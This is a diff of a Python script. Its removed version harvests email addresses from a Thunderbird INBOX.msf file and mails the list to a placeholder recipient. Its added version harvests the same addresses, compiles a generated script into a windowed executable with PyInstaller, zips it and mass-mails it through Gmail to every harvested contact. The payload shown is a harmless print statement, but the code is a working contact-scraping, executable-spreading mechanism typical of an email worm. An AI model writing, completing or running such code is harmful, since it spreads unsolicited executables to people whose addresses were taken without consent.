@@ -1,53 +1,99 @@
-import re
+import os
+import zipfile
 import smtplib
-from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText  # Import MIMEText to handle text body properly
+from email.mime.base import MIMEBase
+from email import encoders
+import subprocess
 
-# Step 1: Read the file content
-def read_file(file_path):
+# Function to extract email addresses from a file
+def extract_emails(file_path):
+    emails = []
     with open(file_path, 'r') as file:
-        content = file.read()
-    return content
-
-# Step 2: Find all email addresses and put them into an array
-def find_emails(content):
-    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-    emails = re.findall(email_pattern, content)
+        lines = file.readlines()
+        for line in lines:
+            if '@' in line:
+                emails.append(line.strip())
     return emails
 
-# Step 3: Send the emails captured with subject "Sample Email"
-def send_email(recipient, email_list):
-    # Define sender's and recipient's email
-    sender_email = "your.email@example.com"  # Replace with your email
-    recipient_email = recipient
+# Step 1: Define the function to create a secondary script
+def create_secondary_script(script_path):
+    script_content = '''
+# Automatically generated secondary script
+def example_function():
+    print("This is an example function in the secondary script.")
     
-    # Set up the email content
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = recipient_email
-    message["Subject"] = "Sample Email"
-    
-    # Create the email body
-    body = "Found emails:\n" + "\n".join(email_list)
-    message.attach(MIMEText(body, "plain"))
+if __name__ == "__main__":
+    example_function()
+'''
+    with open(script_path, 'w') as script_file:
+        script_file.write(script_content)
+    print(f"Secondary script created at {script_path}")
 
-    # Send the email (requires a configured SMTP server)
+# Step 2: Convert Python script to executable using PyInstaller
+def create_executable(script_path):
+    command = f"pyinstaller --onefile --windowed {script_path}"
+    subprocess.run(command, shell=True)
+
+# Step 3: Zip the generated executable
+def zip_executable(executable_path, zip_path):
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        zipf.write(executable_path, os.path.basename(executable_path))
+    print(f"Executable zipped at {zip_path}")
+
+# Step 4: Send email with the executable as an attachment
+def send_email(sender_email, sender_password, recipient_emails, zip_path):
+    subject = "Executable Attachment"
+    body = "Please find the attached executable file."
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['Subject'] = subject
+
+    # Correctly format the email body as MIMEText
+    body_part = MIMEText(body, 'plain')  # Use MIMEText for plain text body
+    msg.attach(body_part)
+
+    # Attach the zip file
+    with open(zip_path, 'rb') as attachment:
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(zip_path)}")
+        msg.attach(part)
+
+    # Send the email
     try:
-        with smtplib.SMTP("smtp.example.com", 587) as server:  # Replace with your SMTP server
-            server.starttls()
-            server.login(sender_email, "your_password")  # Replace with your email and password
-            server.sendmail(sender_email, recipient_email, message.as_string())
-            print("Email sent successfully.")
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.login(sender_email, sender_password)
+        for recipient in recipient_emails:
+            msg['To'] = recipient
+            server.sendmail(sender_email, recipient, msg.as_string())
+        server.quit()
+        print("Email sent successfully!")
     except Exception as e:
-        print("Error sending email: {e}")
+        print(f"Error sending email: {e}")
 
-# Example usage
-file_path = "INBOX.msf"  # Replace with the path to your file
-content = read_file(file_path)
-emails = find_emails(content)
+# Main execution
+if __name__ == "__main__":
+    # 1. Extract emails from file
+    email_file = 'INBOX.msf'  # Change to your file path containing emails
+    recipient_emails = extract_emails(email_file)
 
-# Output emails found for verification
-print("Emails found:", emails)
+    # 2. Generate secondary script
+    script_path = 'generated_secondary_script.py'
+    create_secondary_script(script_path)
 
-# Send the found emails to the recipient
-send_email("recipient.email@example.com", emails)  # Replace with actual recipient
+    # 3. Create executable from the script
+    create_executable(script_path)
+
+    # 4. Zip the executable
+    executable_path = 'dist\\generated_secondary_script.exe'  # Path of the generated executable
+    zip_path = 'generated_executable.zip'
+    zip_executable(executable_path, zip_path)
+
+    # 5. Send email with the zip as an attachment
+    sender_email = 'your@gmail.com'
+    sender_password = 'app password for email'  # App password for Gmail
+    send_email(sender_email, sender_password, recipient_emails, zip_path)
